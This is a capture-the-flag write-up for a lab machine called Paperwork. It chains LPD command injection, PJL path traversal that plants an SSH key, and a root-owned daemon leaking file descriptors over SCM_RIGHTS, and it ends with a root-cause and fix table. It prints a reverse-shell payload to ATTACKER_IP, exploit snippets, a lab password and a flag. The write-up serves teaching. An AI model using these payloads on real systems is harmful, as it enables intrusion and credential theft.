# HTB: Paperwork — Full Writeup

**Target:** `10.129.49.186` (`paperwork.htb`)
**Difficulty theme:** Legacy printer protocols, IPC file-descriptor passing
**Path:** `www/lp (foothold) → archivist (user) → root`

> No buffer overflows. No memory corruption. Just three small, "innocuous" services chained together — each one trusting something it shouldn't have.

---

## 📋 Table of Contents

1. [Background Knowledge](#1-background-knowledge)
2. [Recon](#2-recon)
3. [Stage 1 — Foothold via LPD Command Injection (`lp`)](#3-stage-1--foothold-via-lpd-command-injection-lp)
4. [Stage 2 — Path Traversal in the JetDirect Emulator (`archivist`)](#4-stage-2--path-traversal-in-the-jetdirect-emulator-archivist)
5. [Stage 3 — Root via SCM_RIGHTS File Descriptor Passing](#5-stage-3--root-via-scm_rights-file-descriptor-passing)
6. [Full Attack Chain Summary](#6-full-attack-chain-summary)
7. [Root Cause & Lessons Learned](#7-root-cause--lessons-learned)

---

## 1. Background Knowledge

Before diving in, here's the context needed to understand *why* each bug works — not just *that* it works.

### 1.1 What is LPD (Line Printer Daemon)?

LPD is defined in **RFC 1179**, dating back to the 1980s BSD printing system. It's a plaintext TCP protocol (historically port 515) used to submit print jobs to a remote printer queue. The protocol has a handful of single-byte command codes:

| Byte | Meaning |
|------|---------|
| `0x01` | Print any waiting jobs |
| `0x02` | **Receive a printer job** (submit a job to a queue) |
| `0x03` | Send queue state (short) |
| `0x04` | Send queue state (long) |
| `0x05` | Remove jobs |

When submitting a job (`0x02`), the client then sends a series of **sub-commands**, most importantly:

- **Control file** — metadata about the job: submitting host (`H`), user (`P`), and crucially, **job name (`J`)**. This is meant to be a human-readable label like `"Report.docx"`.
- **Data file** — the actual bytes to print.

The control file format is just newline-separated lines starting with a single letter code. There is no expectation that any of these fields will contain shell metacharacters — but nothing in the RFC stops a malicious client from putting them there. **If a server implementation trusts the job name and feeds it into a shell command, that's a straight path to command execution.**

### 1.2 What is JetDirect / PJL?

**HP JetDirect** is the name for HP's network print server technology, historically listening on **TCP port 9100** (also called "raw printing" or "AppSocket"). Print data sent to port 9100 can include **PJL (Printer Job Language)** commands — a control language HP built into their printers for things like setting duplex mode, querying printer status, and (relevantly here) manipulating the **printer's own onboard storage**, which many enterprise printers have (CompactFlash cards, hard drives) for storing fonts, macros, and scanned documents.

The filesystem commands look like:

```
@PJL FSQUERY NAME="0:\folder"      -- check if a path exists
@PJL FSDIRLIST NAME="0:\folder"    -- list a directory
@PJL FSUPLOAD NAME="0:\file.txt"   -- read a file FROM the printer TO the client
@PJL FSDOWNLOAD NAME="0:\file.txt" SIZE=123  -- write a file FROM the client TO the printer
```

The `0:` prefix refers to the printer's primary storage volume. **This is a real, physical attack surface** — for over a decade, security researchers (notably the "PRET" tool and related work) have shown that printers implementing these commands without proper path sanitization allow **arbitrary file read/write on the printer itself** via `../` traversal, exactly like a web app path traversal bug — except the target is a print spooler, not a web server.

### 1.3 Unix Domain Sockets and `SCM_RIGHTS`

A Unix domain socket is an IPC mechanism for processes on the *same machine* to talk to each other, similar to a network socket but addressed by a filesystem path (e.g. `/run/myapp.sock`) instead of an IP+port. Like any file, it has **owner, group, and permission bits** (`rwx`) — access to connect is gated by the same rules as opening a regular file.

`SCM_RIGHTS` is a special *ancillary/control message* type supported by Unix domain sockets that lets one process **hand an open file descriptor to another process**, over the socket itself, using `sendmsg()`/`recvmsg()`. This is a legitimate and common pattern (e.g. it's how systemd hands sockets to services, how browsers sandbox renderer processes, etc.).

The critical security implication:

> **Once you hold a file descriptor, the filesystem permissions on the *path* no longer matter.** The file was already opened by the *other* process (often with higher privileges), and the descriptor itself is now a capability you own. You can `read()`/`pread()` from it freely, regardless of your own user's permission to open that path directly.

This is exactly the mechanism this box's final privilege escalation abuses.

### 1.4 Shell command injection via Python `subprocess.Popen(..., shell=True)`

When Python code does:

```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

...it hands the *entire string* to `/bin/sh -c "<string>"`. Anything inside `{job_name}` that the shell interprets specially — semicolons, backticks, `$()`, quotes — is interpreted **as shell syntax**, not as literal data. If `job_name` is attacker-controlled, the attacker effectively writes their own shell script. The specific technique used here — **breaking out of a single-quoted string** — is a classic escape:

```
echo 'Archive: <INJECTED>' >> /tmp/archive.log
```
If `<INJECTED>` = `x'; whoami; #`, the shell sees:
```sh
echo 'Archive: x'; whoami; #' >> /tmp/archive.log
```
Which parses as **three** things: a harmless `echo`, our injected `whoami`, and a comment (`#...`) that swallows the rest of the line, including the file redirection we didn't want.

---

## 2. Recon

### 2.1 Nmap

```
nmap -sC -sV 10.129.49.186
```

```
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 10.0p2 Ubuntu 5ubuntu5.4
80/tcp   open     http        nginx 1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
3517/tcp filtered 802-11-iapp
```

The redirect tells us there's a virtual host, so:

```bash
echo "10.129.49.186 paperwork.htb" | sudo tee -a /etc/hosts
```

### 2.2 The web page

`curl -i http://paperwork.htb` returned a static "Intake Portal" page mentioning:

- **`Compliance Level: RFC 1179`** → this is LPD, the printer protocol from 1.1 above.
- **`Target Queue: archive_intake`**
- A download link to `paperwork-archive-v1.02` — an archive of the actual server source code, which we downloaded and extracted (`server.py`).

This is the single most important clue on the whole box: **the developers exposed their own source code**, which meant we could read the vulnerability directly instead of black-box fuzzing a binary protocol.

---

## 3. Stage 1 — Foothold via LPD Command Injection (`lp`)

### 3.1 The vulnerable code

Reading `server.py` (the downloaded archive), the server implements a **simplified, custom LPD server** listening on TCP `1515`:

```python
job_name = "Unknown"
for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]
        break

print(f"{self.id} Executing archive for: {job_name}")
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

`job_name` is read straight out of the **client-supplied control file** — the `J` (job name) line described in section 1.1 — with zero sanitization, then interpolated into a shell string. Classic command injection (see 1.4).

**Bonus bug** found in the same file:

```python
if queue not in VALID_QUEUE:
```

`VALID_QUEUE` is a plain Python string. `not in` on strings does a **substring check**, not equality. Since the empty string `""` is a substring of *any* string, **sending an empty queue name always bypasses this check** — no need to even know the real queue name (`archive_intake`).

### 3.2 Building the exploit

Reverse-engineering the exact byte-level protocol this specific server expects (from its `run()`/`handle_print_job()` logic):

1. Client → Server: `\x02` + queue name + `\n` *(command 2 = "Receive a printer job")*
   Server replies `\x00` if the queue is accepted, `\x01` if rejected.
2. Client → Server: `\x02` + `"<size> <arbitrary name>\n"` *(a "subcommand" header — first byte is unchecked, rest is parsed as `<content-length> <filename>`)*
   Server replies `\x00` (ack — sent unconditionally, before validation).
3. Client → Server: exactly `<size>` bytes — this is the **control file** content, containing a line like `Jyour_payload_here`.
4. Server extracts `job_name` from the `J` line and runs the vulnerable `Popen(...)` call.
5. Server sends two more `\x00` acks, then waits for the socket to close.

### 3.3 The payload

To inject a command, we break out of the single-quoted `echo` and comment out the trailing redirection:

```python
payload = "x'; " + cmd + " #"
```

Resulting shell command executed on the server:

```sh
echo 'Archive: x'; bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" & #' >> /tmp/archive.log
```

This parses as three statements: a harmless echo, our reverse shell launched in the background, and a comment swallowing the leftover syntax.

### 3.4 Result

```
nc -lvnp 4444
...
Ncat: Connection from 10.129.49.186.
lp@paperwork:/opt/LPDServer$ id
uid=7(lp) gid=7(lp) groups=7(lp)
```

**Foothold achieved as `lp`.**

> 💡 **Knowledge gap to fill:** if you've never manually implemented a network protocol handshake in Python raw sockets before, this is a great exercise — it forces you to read code line-by-line and mirror exactly what bytes the server expects, rather than relying on an existing library (there's no off-the-shelf Python "LPD client" for a bespoke, non-standard server like this one).

---

## 4. Stage 2 — Path Traversal in the JetDirect Emulator (`archivist`)

### 4.1 Enumeration after foothold

Basic post-exploitation enumeration (`sudo -l`, SUID binaries, cron, etc.) turned up nothing directly useful. The key discovery came from `ps aux`:

```
archivi+  982  /usr/bin/python3 /home/archivist/printer/jetdirect.py
root     1489  /usr/bin/python3 /usr/bin/paperwork-daemon
lp        984  /usr/bin/python3 /opt/LPDServer/server.py
```

Two processes we hadn't seen from the outside:
- `jetdirect.py`, running **as `archivist`**, listening on `127.0.0.1:9100` (confirmed via `ss -tlnp`) — this is the JetDirect/PJL port described in 1.2.
- `/usr/bin/paperwork-daemon`, running **as root**, world-readable, listening on a Unix socket — this is Stage 3's target.

### 4.2 Reading `paperwork-daemon`'s source (world-readable)

```python
try:
    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
except Exception:
    os._exit(1)

LOG_PATH = "/home/archivist/printer/logs/commands.log"

def scan_for_malice():
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False
```

This told us three things immediately:
1. There's a root-opened file descriptor to a secrets file (`admin_pins.conf`) held open forever.
2. It watches a log file that `jetdirect.py` writes to, for real PJL filesystem command names.
3. This confirmed `jetdirect.py` almost certainly implements those very PJL commands — our next target.

### 4.3 Probing JetDirect blind, then reading its source

Since we couldn't directly read `/home/archivist/printer/jetdirect.py` (permission denied via `cat`, since the parent directory isn't traversable by `lp`), we probed the live service with raw PJL commands and confirmed it was a working filesystem-backed PJL emulator:

```
@PJL FSDIRLIST NAME="0:\"
→ jetdirect.py TYPE=FILE SIZE=5119
```

Then simply **asked the service to upload its own source file to us**, using its own legitimate `FSUPLOAD` command:

```
@PJL FSUPLOAD NAME="0:\jetdirect.py"
```

This is a neat detail: the traversal bug let us exfiltrate the source of the very program we were exploiting, through its own intended functionality.

### 4.4 The vulnerable code

```python
class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))

    def read(self, path):
        target = self._translate(path)
        if os.path.isfile(target):
            with open(target, "rb") as f: return f.read()
        return None

    def write(self, path, data):
        target = self._translate(path)
        os.makedirs(os.path.dirname(target), exist_ok=True)
        with open(target, "wb") as f: f.write(data)
        return "OK"
```

`_translate()` does a **naive string substitution** (`"0:"` → nothing, `\` → `/`) and then joins it onto the configured root with `os.path.join` + `os.path.normpath`. Critically, it **never checks that the resulting path is still inside `self._root`**. Feeding it `..\` sequences walks straight out of the sandbox:

```
0:\..\..\..\etc\passwd  →  /home/archivist/printer/../../../etc/passwd  →  /etc/passwd
```

Since the process runs as `archivist`, this grants **read AND write** access to anything `archivist` can touch — including their own `~/.ssh/` directory.

> 💡 **Knowledge gap to fill:** this is the exact same *class* of bug as web path traversal (`../../../../etc/passwd` in a URL parameter), just wearing a different costume. Any time user input becomes part of a filesystem path — web app, printer protocol, FTP server, archive extractor (see "Zip Slip") — ask: *is this joined path validated to still be inside the intended root, after resolving `..`?* `os.path.normpath` / `os.path.abspath` alone do **not** provide that check; you must explicitly verify the resolved path starts with the intended root directory.

### 4.5 Exploiting it: planting an SSH key

Rather than trying to read `archivist`'s existing (possibly passphrase-protected) private key, we used the **write** primitive (`FSDOWNLOAD`, in HP's naming — "download to the printer") to drop our own public key into their `authorized_keys`:

```python
data = PUBKEY.encode()
cmd = f'@PJL FSDOWNLOAD NAME="0:\\..\\.ssh\\authorized_keys" SIZE={len(data)}\r\n'.encode() + data
```

Generated a fresh keypair locally, wrote the public half via the traversal bug, then:

```bash
ssh -i ./archivist_key archivist@paperwork.htb
```

**Landed as `archivist`.** User flag captured.

---

## 5. Stage 3 — Root via SCM_RIGHTS File Descriptor Passing

### 5.1 Recalling `paperwork-daemon`'s logic

```python
def main():
    socket_path = "/run/paperwork/mgmt.sock"
    ...
    s.bind(socket_path)
    os.chmod(socket_path, 0o660)
    os.chown(socket_path, 0, 1000)   # root : archivist(gid 1000)
    ...
    while True:
        conn, _ = s.accept()
        if scan_for_malice():
            trigger_lockdown(conn)
        else:
            secret = get_admin_secret()
            ...

def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
```

The **intended security mechanism** here is a "tripwire": if the printer command log shows evidence of someone poking at the filesystem commands (exactly what we did in Stage 2!), the daemon is supposed to **lock down and quarantine evidence** for a human/forensic process to review.

**The flaw is in how it quarantines evidence**: instead of just copying the log internally, it uses `SCM_RIGHTS` to hand the *live, root-opened file descriptors* — including `admin_fd`, the handle to the **admin secrets file** — directly to whichever socket client triggered the alert. As covered in section 1.3, **once you hold that descriptor, you can read the secrets file regardless of your own permissions on the path.**

This is the "intended failure mode of a security mechanism" the challenge hints referred to: the alerting system, designed to protect against tampering, is itself the privilege escalation vector.

### 5.2 Requirements to reach it

The socket is `root:archivist`, mode `660` — so only `root` or members of the `archivist` group can even `connect()` to it. This is *why* Stage 2 (becoming `archivist`) had to happen first — the chain only works in this exact order.

### 5.3 Triggering and harvesting

Because our own recon in Stage 2 had already hammered `jetdirect.py` with `FSQUERY`/`FSUPLOAD`/`FSDOWNLOAD` commands, `commands.log` already satisfied `scan_for_malice()` — no extra trigger step was even needed by the time we connected as `archivist`.

```python
import socket, os, array

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

fds = array.array("i")
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_LEN(2 * fds.itemsize))

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds.frombytes(cmsg_data)

for fd in fds:
    print(os.pread(fd, 4096, 0))
```

**Output:**

```
[+] FD 4 content: (commands.log — already seen)
[+] FD 5 content:
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

### 5.4 Root

The leaked password turned out to be **the actual root password**, reused directly:

```bash
su -
Password: ApparelMortuaryCedar22
root@paperwork:~# cat /root/root.txt
59cbe99a8e088978d0984390eae25ec6
```

**Root achieved.** 🎉

---

## 6. Full Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────────┐
│  1. Recon: nmap + web page reveals RFC 1179 (LPD) + source archive  │
└───────────────────────────────┬───────────────────────────────────-─┘
                                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  2. Read leaked server.py → find job_name → shell injection bug     │
│     Exploit via raw-socket LPD protocol implementation               │
│     Result: reverse shell as `lp`                                    │
└───────────────────────────────┬─────────────────────────────────────┘
                                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  3. Enumerate as `lp` → ps aux reveals jetdirect.py (archivist) and  │
│     paperwork-daemon (root) → read paperwork-daemon source (world-  │
│     readable) → understand its dependency on jetdirect.py's log     │
└───────────────────────────────┬─────────────────────────────────────┘
                                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  4. Exfiltrate jetdirect.py source via its own FSUPLOAD command →    │
│     find unvalidated path traversal in Filesystem._translate() →    │
│     use FSDOWNLOAD to plant our SSH pubkey in archivist's            │
│     authorized_keys → SSH in as `archivist`                          │
└───────────────────────────────┬─────────────────────────────────────┘
                                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  5. Now in the `archivist` group → connect to root:archivist         │
│     mgmt.sock → our earlier recon already tripped the "malice"       │
│     detector → daemon leaks admin_fd via SCM_RIGHTS → read it →      │
│     recover ADMIN_PASSWORD → su - → root                             │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 7. Root Cause & Lessons Learned

| # | Root Cause | Category | Fix |
|---|-----------|-----------|-----|
| 1 | `job_name` from an LPD control file passed unsanitized into `subprocess.Popen(..., shell=True)` | Command Injection | Never use `shell=True` with untrusted input; use `subprocess.run([...])` with an argument list, or strictly validate/escape input |
| 2 | `if queue not in VALID_QUEUE` — substring check instead of equality | Logic Error | Use `queue == VALID_QUEUE` (or a set membership check against a list of valid queues) |
| 3 | `Filesystem._translate()` joins user input into a path with no containment check | Path Traversal | After building the target path, verify `os.path.realpath(target).startswith(os.path.realpath(self._root) + os.sep)` before allowing access |
| 4 | `paperwork-daemon` passes a root-privileged file descriptor to an untrusted, unauthenticated socket client as part of an "alerting" mechanism | Privilege Escalation via IPC / Insecure Design | Never hand out a privileged fd in response to an unauthenticated trigger; if evidence needs preserving, have the *privileged* process copy/read it internally and share only the result, not the capability |

### Key takeaways

- **"Niche" protocols are still attack surface.** LPD and JetDirect/PJL are decades old and rarely audited compared to HTTP, but a bug is a bug — untrusted input is untrusted input, regardless of which RFC it's wrapped in.
- **Read the source whenever you can get it.** Every stage of this box was unlocked by finding and reading source code rather than black-box guessing — the leaked archive, the world-readable `paperwork-daemon`, and the JetDirect script exfiltrated via its own upload command.
- **Security mechanisms can *be* the vulnerability.** The `SCM_RIGHTS` "evidence preservation" logic was built with good intentions (catch tampering, preserve forensic proof) but implemented in a way that handed the exact capability an attacker wanted, to the exact person who tripped it.
- **Privilege separation only works if every boundary holds.** Three distinct daemons (`lp`, `archivist`, `root`), each doing one job — but a single flaw in each link let the whole chain unravel, one hop at a time.

---

*Happy hacking — and remember, next time you find a printer protocol exposed, don't skip it as a "legacy curiosity."* 🖨️
